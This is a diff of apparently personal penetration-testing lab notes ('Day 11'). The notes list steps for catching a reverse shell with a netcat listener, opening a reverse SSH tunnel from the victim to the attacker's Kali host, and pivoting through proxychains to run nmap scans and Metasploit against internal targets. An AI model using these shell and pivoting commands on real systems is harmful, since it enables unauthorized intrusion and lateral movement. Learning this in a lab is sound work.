@@ -2,39 +2,29 @@ https://docs.google.com/document/d/1JrZwgBWYPLqBC2X1TcaHTomDRcLvnaJJcHp34pDkkcA/
 [From Day 11]
 
 catch persistent shell	
-(ATK) nc -lvp 55556
+(ATTACKER) nc -lvp 55556
 
 *upgrade shell [2:26]
 Pivot post exploitation
 
-(ATK)(TERM 1) netstat -natp (SHOULD SEE YOUR PORT AND ESTABLISHED)
-
-(ATK)(TERM 1) netstat -natp | grep LISTEN (OUT OUTPUT SHOULD BE 9080 QUAD 0* LISTEN)
+(ATTACKER)(TERM 1) netstat -natp (SHOULD SEE YOUR PORT AND ESTABLISHED)
+(ATTACKER)(TERM 1) netstat -natp | grep LISTEN (OUT OUTPUT SHOULD BE 9080 QUAD 0* LISTEN)
 
 after catching app 1 (MY PORT 55556) SSH
 open ssh for a listner to set up proxy
 
-(ATK)(TERM 1) sudo systemctl status ssh.service > CTL + C (CHECK/CHANGE/CHECK)
+(ATTACKER)(TERM 1) sudo systemctl status ssh.service > CTL + C (CHECK/CHANGE/CHECK)
+(ATTACKER)(TERM 1) sudo systemctl start ssh.service
+(ATTACKER)(TERM 1) REPEAT LINE 11 FOR (CHECK/CHANGE/CHECK)
 
-(ATK)(TERM 1) sudo systemctl start ssh.service
-
-(ATK)(TERM 1) REPEAT LINE 11 FOR (CHECK/CHANGE/CHECK)
-
-
-
-(VIC 1) ssh -N -f -R 127.0.0.1:9080 kali@192.168.122.209 -p 55555 (MAKE SURE PORT FWD RULE IS GOOD ON PFSENSE SSH PORT 22)
+(VICTIM) ssh -N -f -R 127.0.0.1:9080 kali@192.168.122.209 -p 55555 (MAKE SURE PORT FWD RULE IS GOOD ON PFSENSE SSH PORT 22)
 if it states port fowarding failed it means you alrady have ypur proxy open
+(VICTIM) should be promted a password
 
-(VIC 1) should be promted a pass
+(ATTACKER)(TERM 2) LS > CD INTERNAL (SHOULD SEE IP'S PING SWEEPS AND TARGETS) > LS > CD 192.168.1.102 
+(ATTACKER)(TERM 2) sudo proxychains nmap -iL scope -F -Pn -sT | tee fast_scan
+[didnt really use] (ATTACKER)(TERM 2) sudo proxychains nmap -iL scope -sV -Pn -sT | tee service_scan [1:19:52] 
+(ATTACKER)(TERM 3) sudo proxychains msfconsole [1:24:44]
 
-
-(ATK)(TERM 2) LS > CD INTERNAL (SHOULD SEE IP'S PING SWEEPS AND TARGETS) > LS > CD 192.168.1.102 
-
-(ATK)(TERM 2) sudo proxychains nmap -iL scope -F -Pn -sT | tee fast_scan
-
-didnt really use (ATK)(TERM 2) sudo proxychains nmap -iL scope -sV -Pn -sT | tee service_scan [1:19:52] 
-
-(ATK)(TERM 3) sudo proxychains msfconsole [1:24:44]
-
-[[continued... on Metasploit through proxy chains]]
+[[[[continued... on Metasploit through proxy chains]]]]
 
